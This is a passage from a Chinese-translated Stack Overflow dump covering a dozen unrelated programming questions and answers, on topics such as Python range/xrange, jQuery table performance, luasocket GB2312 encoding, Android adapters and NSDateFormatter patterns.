> 时间：2012-11-24T02:48:42.640

如果只是抚摸或填充单个路径，则可以将其包装在`UIBezierPath`符合`NSCoding`协议的 a 中，然后您可以序列化`UIBezierPath`：

```
UIBezierPath *uiPath = [UIBezierPath bezierPathWithCGPath:cgPath];
NSData *data = [NSKeyedArchiver archivedDataWithRootObject:uiPath]; 
```

然后您可以写入`data`文件或数据库或其他任何内容。稍后您可以转换`data`回 a`UIBezierPath`然后 a `CGPath`：

```
UIBezierPath *uiPath = [NSKeyedUnarchiver unarchiveObjectWithData:data];
CGPathRef cgPath = uiPath.CGPath; 
```

如果您正在绘制比单个路径更复杂的东西，以可缩放（矢量）格式序列化您的绘图的最简单方法是绘制到 a`CGPDFContext`而不是 a `CGBitmapContext`。A`CGPDFContext`将您的绘图命令记录到 PDF 中。稍后，您可以为 PDF 创建一个`CGPDFDocument`，并使用它将 PDF 绘制到您的位图上下文中。阅读[* Quartz 2D 编程指南* 的 PDF 文档创建、查看和转换章节](https://developer.apple.com/library/ios/documentation/GraphicsImaging/Conceptual/drawingwithquartz2d/dq_pdf/dq_pdf.html#//apple_ref/doc/uid/TP30001066-CH214-TPXREF101)了解详细信息。

# python - python中的列表理解函数

> ID：13537571
> 
> 赞同：1
> 
> 时间：2012-11-24T01:49:31.080
> 
> 标签：python, map, filter, reduce

有 map、reduce、filter 函数来进行列表理解。

`xrange`将参数或`range`参数传递给每个函数有什么区别？
例如：

```
map(someFunc, range(1,11)) 
```

或者

```
map(someFunc,xrange(1,11)) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T01:52:44.197

在 Python 2 中，`range`返回一个实际列表，同时`xrange`返回一个可以迭代的生成函数。由于`map`只关心它迭代一个序列，因此两者都适用，尽管`xrange`使用较少的内存。Python 3 的`xrange`replaces `range`，所以你唯一的选择是用来`range`返回一个生成函数。（如果需要，您可以使用它`[i for i in range(10)]`来生成实际范围。）

~~模运算符返回`0`偶数的假值： 2 mod 2 为 0。因此，偶数被过滤掉。~~

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T01:56:01.673

实际上，`map`、`reduce`和`filter`函数是列表推导式的*替代方案。*术语“列表理解”是指特定的句法结构；任何看起来不像列表推导的东西不一定是列表推导。

它们实际上早于列表推导，并且是从其他语言中借来的。但是这些语言中的大多数都有构建匿名函数的方法，这些方法比 Python 更强大`lambda`，因此这些函数更自然。列表推导被认为更适合 Python。

`range`and之间的区别在于`xrange`它`range`实际上构造了一个包含构成范围的数字的列表，而 an`xrange`是一个知道其端点并且可以迭代自身的对象，而无需实际在内存中构造完整的值列表。 `xrange(1,1000)`占用的空间不超过`xrange(1,5)`，而`range(1,1000)`生成一个包含 999 个元素的列表。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-24T02:07:26.277

如果`range()`和`xrange()`是用 Python 语言实现的，它们看起来像这样：

```
def xrange(start, stop=None, step=1):
    if stop is None: stop, start = start, 0
    i = start
    while i < stop:
        yield i
        i += step

def range(start, stop=None, step=1):
    if stop is None: stop, start = start, 0
    acc, i = [], start
    while i < stop:
        acc.append(i)
        i += step
    return acc 
```

如您所见，`range()`创建一个列表并返回它，同时`xrange()`根据需要延迟生成一个范围内的值。这样做的好处是避免了创建列表的开销`xrange()`，因为它不存储值或创建列表对象。在大多数情况下，最终结果没有区别。

一个明显的区别是`xrange()`不支持切片：

```
>>> range(10)[2:5]
[2, 3, 4]
>>> xrange(10)[2:5]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: sequence index must be integer, not 'slice'
>>> 
```

但它确实支持索引：

```
>>> xrange(11)[10]
10 
```

# mocking - 在 VS 2012 中远离 Pex 和 Moles？

> ID：13537575
> 
> 赞同：7
> 
> 时间：2012-11-24T01:50:10.657
> 
> 标签：mocking, visual-studio-2012, moles, pex

谈到测试，我已经支持它。我现在是一个超级粉丝，并且经常做 TDD 之类的事情。在 VS 2010 的设计和回归中，我刚刚使用了 MSTEST。这很棒——我的所有项目都是开源的，并且无论如何都与我的工作相关（物理研究@大学）。然后我进入了 Pex，它帮助我找到了我没有寻找的各种边缘情况。总的来说，这是我编码方式的一场革命。这让我认识了 Moles。也很酷（但我还在学习）。

不幸的是，我只能访问专业版的 VS（这是我的大学作为站点许可证获得的）。结果是 Moles 不再起作用，而升级版 Fakes 也不起作用。而且我会想象 Pex 的下一个版本将依赖于 Fakes，使其成为 Ultimate-only 选项。

因此，我发现自己现在正在寻找具有类似功能的开源工具。是否有文章或资源比较了一些更成熟的 OSS 项目？我发现自己有点不知所措（即选择太多）。虽然我喜欢这种模拟能力，但它是一个工具，而不是我想在业余时间玩的东西（这是我的大部分 .NET 编程发生的地方）。

我认为如果不花真钱，Pex 将无法替代。

虽然我在做这件事，但似乎我应该看看是否有其他测试框架比 MSTEST 更好。MSTEST 相当不错，但开始感觉有点受限（我还没有探索 VS2012 中的任何新功能，如果有的话）。

非常感谢您提前提供的帮助，实际上，通常我会尝试提出更具体的问题，但我在这里有点不知所措。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-15T07:31:36.563

1.  即使您通常在 VS 2012 中工作，您也可以通过在 VS 2010 中打开解决方案来继续使用 PEX 生成测试。VS 项目架构在 VS 2010 和 VS 2012 之间非常兼容。您也可以考虑运行命令线 PEX 从 2010 加载项。请参阅  [https://stackoverflow.com/a/6809669](https://stackoverflow.com/a/6809669)

2.  PEX 应该与其他模拟框架一起使用，不限于 Moles 或 Fakes，例如，请参阅[将 Pex 与 MoQ 集成](https://stackoverflow.com/questions/3071091/integrate-pex-with-moq)

3.  假货现在可用于 VS Premium - 请参阅 [http://visualstudio.uservoice.com/forums/121579-visual-studio/suggestions/2919309-provide-microsoft-fakes-with-all-visual-studio-edi](http://visualstudio.uservoice.com/forums/121579-visual-studio/suggestions/2919309-provide-microsoft-fakes-with-all-visual-studio-edi)

4.  我们的团队从各种各样的模拟框架中选择了[NSubstitute](http://nsubstitute.github.io/)，我们对此非常满意。 

5.  我也不知道在 .NET 中生成测试的 PEX 替代方案。但是看看 AutoFixture，  [这两个项目都专注于自动生成测试输入](https://github.com/AutoFixture/AutoFixture/wiki/FAQ#what-is-the-difference-between-autofixture-and-pex-both-projects-seem-to-focus-on-auto-generating-test-input)  “通过将 AutoFixture 用于 TDD，然后将 Pex 用于 QA，将 AutoFixture 和 Pex 结合使用是有意义的。”

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-24T20:34:58.900

我不知道在 .NET 中测试 PEX 的替代方法。

Fakes 框架有许多替代方案，例如[Moq](http://code.google.com/p/moq/)或[Rhino Mocks](http://www.hibernatingrhinos.com/oss/rhino-mocks)。有关更完整的列表，请参见[此处。](https://stackoverflow.com/q/37359/131345)我个人使用 Moq 是因为我喜欢流畅的 API，它支持[经典和模拟](http://martinfowler.com/articles/mocksArentStubs.html)风格的测试。

Fakes 框架还包括为对单元测试不友好的类型（例如密封类型或静态方法）生成填充程序的能力。[TypeMock Isolator](http://www.typemock.com/isolator-product-page)可能是唯一的替代品，但它不是免费的。如果你不能编写自己的测试友好包装器，或者使用某种形式的[鸭子类型](http://haacked.com/archive/2007/08/19/why-duck-typing-matters-to-c-developers.aspx)。

Visual Studio 2012 有一个用于测试运行器的插件架构，Peter Provst[在此处](http://www.peterprovost.org/blog/2012/02/29/Visual-Studio-11-Beta-Unit-Testing-Plugins-List/)维护了一个插件列表。我认为 VS 2012 现在使用[vstestconsole](http://blogs.msdn.com/b/bhuvaneshwari/archive/2012/06/16/vstest-console-exe-commandline-test-runner.aspx)而不是 MSTest，在 2012 年运行单元测试确实感觉比 2010 快很多。NUnit 对参数化测试的支持比 MSTest 更好。

# javascript - 填充 500 行的表格需要很长时间 - jQuery 和 Bootstrap CSS

> ID：13537578
> 
> 赞同：2
> 
> 时间：2012-11-24T01:51:05.437
> 
> 标签：javascript, jquery, html, twitter-bootstrap

受到对[这个问题](https://stackoverflow.com/questions/13537096/can-i-force-the-browser-to-render-out-the-dom-changes-before-continuing-javascri)的评论的启发，我整理了[一个 testcase](https://s3-eu-west-1.amazonaws.com/se-andrekr/populating-table-slow/index.htm)。

它在我的 PC 上的 Chrome 23 中填充了一个包含 500 行的表，这大约需要 15 秒。删除 Bootstrap CSS 并不能完全使其立即生效，但会显着缩短时间。

添加行的实际代码是：

```
$.each(response, function (idx, row) {
  var new_row = $('#row_template').clone();
  new_row.removeAttr('id');
  $('td[data-name=col1]', new_row).text(row.col1);
  $('td[data-name=col2]', new_row).text(row.col2);
  $('td[data-name=col3]', new_row).text(row.col3);
  $('td[data-name=col4]', new_row).text(row.col4);
  $('td[data-name=col5]', new_row).text(row.col5);
  $('td[data-name=col6]', new_row).text(row.col6);
  $('td[data-name=col7]', new_row).text(row.col7);
  $('td[data-name=col8]', new_row).text(row.col8);
  $('td[data-name=col9]', new_row).text(row.col9);
  $('td[data-name=col10]', new_row).text(row.col10);
  new_row.insertBefore($('#row_template')).show();
}); 
```

我可能会通过连接 HTML 和 获得绝对最低的执行时间`getElementById().innerHTML`，但是我可以在保持一些易用性的同时进行任何其他明显的优化（尤其是从模板中获取行）吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:15:13.050

只有在表格可见时执行此操作才会很慢。如果您之前隐藏它并在更改后再次显示它，它会非常快：

```
$('#results').hide();

$.each(response, function (idx, row) {
  ...
});

$('#results').show(); 
```

在这里查看我的解决方案：http: [//smartk8.no-ip.org/stackoverflow/13537578.htm](http://smartk8.no-ip.org/stackoverflow/13537578.htm)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T02:44:58.947

不要添加每一行 - 这意味着重绘 500 次。将它们添加到一个 html 字符串并将其添加到您的页面。示例：http: [//jsfiddle.net/yLSy9/](http://jsfiddle.net/yLSy9/)

```
<button id="addmany">Add one at a time</button>
<button id="addonce">Conact then add</button>
<table>
</table>​ 
```

问：

```
$('#addmany').on('click', function(){

    for (i=0; i<5000; i++)
    {
        var row=$('<tr><td>test</td></tr>');
        row.appendTo('table');
    }
});

$('#addonce').on('click', function(){
    rows='';
    for (i=0; i<5000; i++)
    {
        var row='<tr><td>test</td></tr>';
        rows=rows+row;
    }
    $(rows).appendTo('table');
});

​ 
```

# sockets - 使用luasocket的HTTP GET汉字

> ID：13537579
> 
> 赞同：2
> 
> 时间：2012-11-24T01:51:27.137
> 
> 标签：sockets, unicode, lua, cjk, luasocket

我使用 luasocket 来获取一个包含汉字“开奖结果”的网页（页面本身编码为 charset="gb2312"），如下所示：

```
require "socket"
host = '61.129.89.226'
fileformat = '/fcopen/cp_kjgg_dfw.jsp?lottery_type=ssq&lottery_issue=%s'
function getlottery(num)
  c = assert(socket.connect(host, 80))
  c:send('GET ' .. string.format(fileformat, num)  .. " HTTP/1.0\r\n\r\n")
  content = c:receive('*l')
  while content do
    if content and content:find('开奖结果') then -- failed
      print(content)
    end
    content = c:receive('*l')
  end
  c:close()
end

--http://61.129.89.226/fcopen/cp_kjgg_dfw.jsp?lottery_type=ssq&lottery_issue=2012138
getlottery('2012138') 
```

不幸的是，它无法匹配预期的字符：

```
content:find('开奖结果') -- failed 
```

我知道 Lua 能够找到 unicode 字符：

```
Lua 5.1.4  Copyright (C) 1994-2008 Lua.org, PUC-Rio
> if string.find("This is 开奖结果", "开奖结果") then print("found!") end
found! 
```

那我猜这可能是luasocket如何从网络上检索数据引起的。任何人都可以对此有所了解吗？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T04:46:49.410

如果页面以 GB2312 编码，而您的脚本（文件本身）以 utf-8 编码，则匹配无法正常工作。因为`.find()`会查找 utf-8 代码点，它只会滑过您要查找的字符，因为它们的编码方式不同......

```
 开    奖      结     果
GB      bfaa   bdb1   bde1   b9fb
UTF-16  5f00   5956   7ed3   679c
UTF-8   e5bc80 e5a596 e7bb93 e69e9c 
```

# android - 阵列适配器强制关闭我的 Android 应用

> ID：13537582
> 
> 赞同：0
> 
> 时间：2012-11-24T01:51:48.793
> 
> 标签：android, eclipse, listview, android-arrayadapter

所以我正在尝试实现一个自定义数组适配器。到目前为止，我已经成功地将它设置为我的 ListFragment。然后问题开始出现。我的主要 xml 布局中有一个 FrameLayout，我使用 FragmentTransaction 添加了我的 ListFragment（还没有任何代码）。这是我的代码：

阵列适配器：

```
package tj.apps.files;

import java.util.ArrayList;

import android.app.Activity;
import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.TextView;

public class ItemAdapter extends ArrayAdapter<Item> {

int resource; 
Context context;
ArrayList<Item> items;

public ItemAdapter(Context context, int resource, ArrayList<Item> items) {
    super(context, resource, items);
    this.resource = resource;
    this.context = context;
    this.items = items;
}

@Override
    public View getView(int position, View convertView, ViewGroup parent) {
    ItemHolder holder = null;

    if (convertView == null) {
        LayoutInflater inflater = ((Activity) context).getLayoutInflater();
        convertView = inflater.inflate(resource, parent, false);

        holder = new ItemHolder();

        convertView.setClickable(true);
        convertView.setFocusable(true);

        holder.image= (ImageView) convertView.findViewById(R.id.item_image);
        holder.text = (TextView) convertView.findViewById(R.id.item_text);

        convertView.setTag(holder);

    } else {
        holder = (ItemHolder) convertView.getTag();
    }

    holder.image.setImageResource(R.drawable.search_icon);
    holder.text.setText(items.get(position).getName());

    return convertView;
}

static class ItemHolder {
    ImageView image;
    TextView text;
}
} 
```

主要活动：

```
package tj.apps.files;

import java.util.ArrayList;

import android.os.Bundle;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;

import com.actionbarsherlock.app.SherlockFragmentActivity;
import com.actionbarsherlock.view.MenuInflater;
import com.actionbarsherlock.view.MenuItem;

public class FilesList extends SherlockFragmentActivity {

private ItemAdapter aa; 
private ArrayList<Item> array; 

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.files_list);

    FragmentManager fm = getSupportFragmentManager();
    FragmentTransaction ft = fm.beginTransaction();
    ft.add(R.id.fragment_listview, new ListFragment());
    ft.commit();

    array = new ArrayList<Item>();
    array.add(new Item("Help"));
    aa = new ItemAdapter(this, R.layout.list_item, array);

    ListFragment listFragment = (ListFragment)     fm.findFragmentById(R.id.fragment_listview);
    listFragment.setListAdapter(aa);
}

@Override
public boolean onCreateOptionsMenu(com.actionbarsherlock.view.Menu menu) {
    MenuInflater inflater = getSupportMenuInflater();
    inflater.inflate(R.menu.files_list, menu);
    return true;
}

@Override
public boolean onOptionsItemSelected(MenuItem item) {
    switch (item.getItemId()) {
    case R.id.menu_search:
        return true;
    case R.id.menu_edit_mode:
        return true; 
    case R.id.menu_help:
        return true;
    case R.id.menu_about: 
        return true; 
    default: 
        return super.onOptionsItemSelected(item);
    }
}

} 
```

自定义行布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="wrap_content"
android:orientation="horizontal" >

<ImageView
    android:id="@+id/item_image" 
    android:layout_width="@dimen/item_size"
    android:layout_height="@dimen/item_size"
    />

<TextView
    android:id="@+id/item_text"
    android:layout_width="match_parent"
    android:layout_height="@dimen/item_size"
    android:padding="15sp"
    android:textSize="@dimen/item_text_size"
    />

</LinearLayout> 
```

这是我的日志：

```
11-23 17:26:22.983: E/AndroidRuntime(30582): FATAL EXCEPTION: main
11-23 17:26:22.983: E/AndroidRuntime(30582): java.lang.RuntimeException: Unable to start activity ComponentInfo{tj.apps.files/tj.apps.files.FilesList}: java.lang.NullPointerException
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2059)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2084)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.app.ActivityThread.access$600(ActivityThread.java:130)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1195)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.os.Handler.dispatchMessage(Handler.java:99)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.os.Looper.loop(Looper.java:137)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.app.ActivityThread.main(ActivityThread.java:4745)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at java.lang.reflect.Method.invokeNative(Native Method)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at java.lang.reflect.Method.invoke(Method.java:511)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:789)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:556)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at dalvik.system.NativeStart.main(Native Method)
11-23 17:26:22.983: E/AndroidRuntime(30582): Caused by: java.lang.NullPointerException
11-23 17:26:22.983: E/AndroidRuntime(30582):    at tj.apps.files.FilesList.onCreate(FilesList.java:33)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.app.Activity.performCreate(Activity.java:5008)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1079)
11-23 17:26:22.983: E/AndroidRuntime(30582):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2023)
11-23 17:26:22.983: E/AndroidRuntime(30582):    ... 11 more 
```

如果我在主活动中添加 setListAdapter 方法，应用程序开始强制关闭。如果我删除它，则没有强制关闭。这里有什么问题？

# objective-c - 从 NSString 到 NSDate 再转换回来

> ID：13537589
> 
> 赞同：1
> 
> 时间：2012-11-24T01:52:53.930
> 
> 标签：objective-c, ios

我知道以前有人问过这个问题（最值得注意的是：[Converting NSString to NSDate (and back again)](https://stackoverflow.com/questions/3917250/converting-nsstring-to-nsdate-and-back-again)），但我遇到了困难。我正在使用 RSS 提要解析器，它以这种格式返回日期：

```
Fri, 23 Nov 2012 15:39:00 -0800 
```

我希望将其转换为这种格式：

```
Nov. 23 2012 
```

单独的时间格式如下：

```
3:39:00 PM 
```

这是我目前拥有的代码：

```
NSString *RSSDate1=@"Fri, 23 Nov 2012 15:39:00 -0800";
NSDateFormatter *RSSDateFormatter = [[NSDateFormatter alloc] init];
[RSSDateFormatter setDateFormat:@"D, d M Y H:i:s O"];
NSDate *dateFromString = [[NSDate alloc] init];
dateFromString = [RSSDateFormatter dateFromString:RSSDate1];
[RSSDateFormatter release];
NSDateFormatter *RSSDateFormatter2=[[NSDateFormatter alloc] init];
[RSSDateFormatter2 setDateStyle:NSDateFormatterShortStyle];
UIAlertView *dateAlert=[[UIAlertView alloc] init];
[dateAlert setTitle:[RSSDateFormatter2 stringFromDate:dateFromString]];
[dateAlert addButtonWithTitle:@"Dismiss"];
[dateAlert show];
[dateAlert release]; 
```

现在，字符串返回 nil，所以我打赌我的格式是关闭的。任何帮助，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:10:05.813

您可以尝试使用此配置的 NSDateFormatter 将当前日期（现在）转换为 NSString 并打印出字符串。查看输出的格式并将其与您想要的格式进行比较。差异应该会提示您需要更改哪些内容才能获得所需的格式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T02:12:40.933

改成，

```
NSString *RSSDate1 = @"Fri, 23 Nov 2012 15:39:00 -0800";
NSDateFormatter *RSSDateFormatter = [[NSDateFormatter alloc] init];
[RSSDateFormatter setDateFormat:@"EEE, dd MMM yyyy HH:mm:ss zzzzz"];

NSDate *dateFromString = [[NSDate alloc] init];
dateFromString = [RSSDateFormatter dateFromString:RSSDate1];
NSLog(@"dateFromString = %@", dateFromString);    
[RSSDateFormatter release];

NSDateFormatter *RSSDateFormatter2 = [[NSDateFormatter alloc] init];
[RSSDateFormatter2 setDateFormat:@"MMM dd, yyyy hh:mm aaa"];
NSLog(@"dateToString = %@", [RSSDateFormatter2 stringFromDate:dateFromString]);

UIAlertView *dateAlert = [[UIAlertView alloc] init];
[dateAlert setTitle:[RSSDateFormatter2 stringFromDate:dateFromString]];
[dateAlert addButtonWithTitle:@"Dismiss"];
[dateAlert show];
[dateAlert release]; 
```

**输出：**

> dateToString = 2012 年 11 月 23 日下午 3:39

请注意，“Fri, 23 Nov 2012 15:39:00 -0800”的格式为“EEE, dd MMM yyyy HH:mm:ss zzzzz”，“Nov 23, 2012 03:39 PM”的格式为“MMM dd , yyyy hh:mm aaa"。格式中的每个字母代表日期字符串中的相应单词。例如：- EEE 用于周五，aaa 用于 PM 等。检查[此以获取](http://unicode.org/reports/tr35/tr35-6.html#Date_Format_Patterns)有关如何进行此格式化的更多信息。

# php - 无法使用 json 事件提供完整的日历

> ID：13537591
> 
> 赞同：2
> 
> 时间：2012-11-24T01:53:16.820
> 
> 标签：php, jquery, json, fullcalendar

我正在尝试下面的代码..集成全日历：-

```
<doctype! html>
    <html lang="urf-8">
    <head>
    <title>Full calendar</title>
    <link rel="stylesheet" href="fullcalendar.css"/>
    <link rel="stylesheet" href="http://code.jquery.com/ui/1.9.1/themes/base/jquery-ui.css"/>
    <script type='text/javascript' src='jquery.js'></script>
    <script type='text/javascript' src='fullcalendar.js'></script>
    <script>
    $(document).ready(function() {
        $('#cal').fullCalendar({
            // put your options and callbacks here
            theme: true,
            header: {
                    left: 'prev,next today',
                    center: 'title',
                    right: 'month,basicWeek,basicDay,agendaWeek,agendaDay'
                    },
            editable: false,
            events: "json-events.php",
    })
    });

    </script>
    </head>
    <body>
        <div id="cal" ></div>
    </body>
    </html> 
```

Json-events.php 代码：-

```
<?php
    include("connect.php");
    $query = "select * from calendar";

    $res = mysql_query($query) or die(mysql_error());
    $events = array();
    while ($row = mysql_fetch_assoc($res)) {
        $eventsArray['id'] =  $row['calendar_id'];
        $eventsArray['title'] = $row['subject'];
        $eventsArray['start'] = mktime($row['start_date_time']);
        $events[] = $eventsArray;
    }
    echo json_encode($events);
    ?> 
```

为了在我访问 json-events.php 时进行调试，我得到了结果，但在 fullcalendar 中没有显示任何事件。

请帮我..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T06:08:07.900

问题在于 JSON 中日期字符串的格式。格式与插件的日期格式不兼容。如果您使用`strtotime()`php 转换为 UNIX 时间戳，它们将起作用。

# html - CSS白色间距问题

> ID：13537593
> 
> 赞同：1
> 
> 时间：2012-11-24T01:53:43.777
> 
> 标签：html, css

如何删除在 website.com 上找到的元素 div 下方的空白就像 730 像素的空白。一个多小时以来，我一直在摆弄我的 css 代码。我似乎无法隔离问题

HTML：

```
<div class="element">
<img src="imagesrc">
<div id="Projecttitle" class="Projecttitle">Title goes here</div>
<div id="Projectdescription" class="Projectdescription">Project description goes here</div>
</div>

<div class="element">
<img src="imagesrc">
<div id="Projecttitle" class="Projecttitle">Title goes here</div>
<div id="Projectdescription" class="Projectdescription">Project description goes here</div>
</div> 
```

CSS：

```
div.element img:nth-of-type(1){
    padding-top:80px;
}
div.element div:not(:nth-of-type(1)){
    position:relative;
    width:auto;
    height:auto;
    bottom:375px;

}

div.element img{
    position:relative;
    right:198px;
    padding-right:56px;
    border:none;

}
.Projecttitle{
    text-transform:none;
color:#000;
text-align:left;
letter-spacing:.3px;
font:normal 22px QuaverSans;
margin-left:auto;
margin-right:auto;
overflow:visible;
z-index:0;
vertical-align:middle;
padding-top:15px;

}
#Projecttitle{
    position:relative;
    bottom:162px;
    width:410px;
    height:155px;
    left:226px;
}
.Projectdescription{
    text-transform:none;
color:#000;
text-align:left;
letter-spacing:.3px;
font:normal 17px QuaverSans;
margin-left:auto;
margin-right:auto;
overflow:visible;
z-index:0;
vertical-align:middle;

}
#Projectdescription{
    position:relative;
    bottom:290px;
    width:410px;
    height:155px;
    left:226px;
    z-index:0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:36:03.480

首先，您有一个未关闭的`div`标签。当他们显然应该是兄弟姐妹时，第二个`div.element`嵌套在第一个内部。当您解决此问题时，问题将变得更加明显。你也使用了太多的*相对定位*。这使问题更加混乱，因为屏幕上元素的外观发生了变化，但它在文档流中“占用”的空间没有变化。

# python - 如何将两个列表转换为字典（一个列表是键，另一个是值）？

> ID：13537595
> 
> 赞同：2
> 
> 时间：2012-11-24T01:55:41.450
> 
> 标签：python

这是 python 中 IDLE2 中的代码和错误。

我需要有序地包含每个“数据”元素作为键和值“otro”。好吧，“data”和“otro”是一个包含 38 个字符串的列表，至于“dik”，它是一个字典。

```
>>> for i in range(len(otro)+1):
    dik[dato[i]] = otro[i]  

Traceback (most recent call last):
  File "<pyshell#206>", line 2, in <module>
    dik[dato[i]] = otro[i]
IndexError: list index out of range
>>> 
```

这个问题是 range(0, 38) 输出 -> (0, 1,2,3 ... 37) 而且很乱

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-24T02:01:03.850

我认为是这样的：

```
dik = dict(zip(dato,otro)) 
```

是不是有点干净...

* * *

如果`dik`已经存在并且您只是在更新它：

```
dik.update(zip(dato,otro)) 
```

* * *

如果你不知道[`zip`](http://docs.python.org/2/library/functions.html#zip)，你应该花一点时间学习它。它超级有用。

```
a = [ 1 , 2 , 3 , 4 ]
b = ['a','b','c','d']
zip(a,b)   #=>   [(1,'a'),(2,'b'),(3,'c'),(4,'d')] #(This is actually a zip-object on python 3.x) 
```

`zip`也可以采用更多参数 ( `zip(a,b,c)`) 例如会给你一个 3 元组列表，但这对于这里的讨论并不是非常重要。

这恰好是[`dict`](http://docs.python.org/2/library/functions.html#func-dict)“构造函数”（类型）喜欢初始化一组`key-value`对的事情之一。每个中的第一个元素`tuple`是`key`，第二个元素是`value`。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-11-24T01:57:10.490

错误来自这个：`range(len(otro)+1)`。当你使用`range`时，上限值实际上并没有被迭代，所以当你说`range(5)`，例如，你的迭代是`0, 1, 2, 3, 4`，其中 position`5`是元素`4`。如果我们然后获取该列表元素并说`for i in range(len(nums)+1): print nums[i]`，最终`i`将是`len(nums) + 1 = 6`，如您所见，这将导致错误。

迭代某些东西的更“Pythonic”的方法是不使用`len`列表的 - 你迭代列表本身，必要时使用以下方法提取索引`enumerate`：

```
In [1]: my_list = ['one', 'two', 'three']

In [2]: for index, item in enumerate(my_list):
   ...:     print index, item
   ...:
   ...:
0 one
1 two
2 three 
```

将此应用于您的案例，然后您可以说：

```
>>> for index, item in enumerate(otro):
...    dik[dato[index]] = item 
```

然而，与 Pythonicity 主题保持一致，@mgilson`zip`是此构造的更好版本。

# c# - 为什么我的组合框除了其中一个值以外的所有值都显示为灰色，并且不允许选择它们？

> ID：13537596
> 
> 赞同：0
> 
> 时间：2012-11-24T01:55:48.187
> 
> 标签：c#, combobox, windows-8, winrt-xaml, windows-store-apps

我有一个值为 1..21 的 ComboBox

当我下拉组合框时，数字 1（项目 0）已启用，但所有其他项目都显示为灰色，我无法选择其中任何一个。事实上，我只能在滚动列表时看到它们的值——否则它们是完全透明的。

这是我的winrt-xmal：

```
 <ComboBox x:Name="cmbxInitialMapZoomSetting" Grid.Row="1" Grid.Column="1" Height="32" Margin="4" Width="120" HorizontalAlignment="Left" SelectionChanged="CmbxInitialMapZoomSetting_OnSelectionChanged">
                <Button Content="1"/>
                <Button Content="2"/>
                <Button Content="3"/>
        . . .
                <Button Content="19"/>
                <Button Content="20"/>
                <Button Content="21"/>
            </ComboBox> 
```

...这是相关的代码：

```
private void CmbxInitialMapZoomSetting_OnSelectionChanged(object sender, SelectionChangedEventArgs e)
{
    ApplicationData.Current.LocalSettings.Values["MapZoomSetting"] = cmbxInitialMapZoomSetting.SelectedValue;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T08:45:13.017

你有理由把`Button`s 放进去`ComboBox`吗？您可以使用`ComboBoxItem`s 代替：

```
<ComboBox x:Name="cmbxInitialMapZoomSetting" Height="32" Margin="4" Width="120" HorizontalAlignment="Left" SelectionChanged="CmbxInitialMapZoomSetting_OnSelectionChanged">
    <ComboBoxItem>1</ComboBoxItem>
    <ComboBoxItem>2</ComboBoxItem>
    <ComboBoxItem>3</ComboBoxItem>
    <ComboBoxItem>4</ComboBoxItem>
    <ComboBoxItem>5</ComboBoxItem>
</ComboBox> 
```

您只需要对事件处理程序进行少量修改即可使其工作：

```
private void CmbxInitialMapZoomSetting_OnSelectionChanged(object sender, SelectionChangedEventArgs e)
{
    ApplicationData.Current.LocalSettings.Values["MapZoomSetting"] = (cmbxInitialMapZoomSetting.SelectedValue as ComboBoxItem).Content.ToString();
} 
```

# asp.net - 无法获得 EF5.0 codefirst 迁移以创建初始数据库

> ID：13537600
> 
> 赞同：1
> 
> 时间：2012-11-24T01:56:44.267
> 
> 标签：asp.net, web-applications, entity-framework-5

我正在编写我的第一个 Web 应用程序，并尝试先学习 EF 5.0 代码。在过去的两天里，我在谷歌和 MSDN 上试图弄清楚如何让这些东西发挥作用，但这些东西都不是真正适合第一次学习的人。那么有人可以帮我使用代码示例来说明我做错了什么吗？当我在调试中运行我的应用程序时，没有创建任何数据库，当我尝试从 VS2012 的包管理器配置迁移时，我收到一条错误消息，提示“从数据库获取提供程序信息时发生错误”。打击是我的“table”.cs 文件，Context.cs 和 web.config。从我读过的所有东西中可以看出，我没有遗漏任何东西。

表.cs：

```
using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;

namespace FFCollection.DAL
{
    public class Item
    {
        [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
        public Int16 ItemID { get; set; }

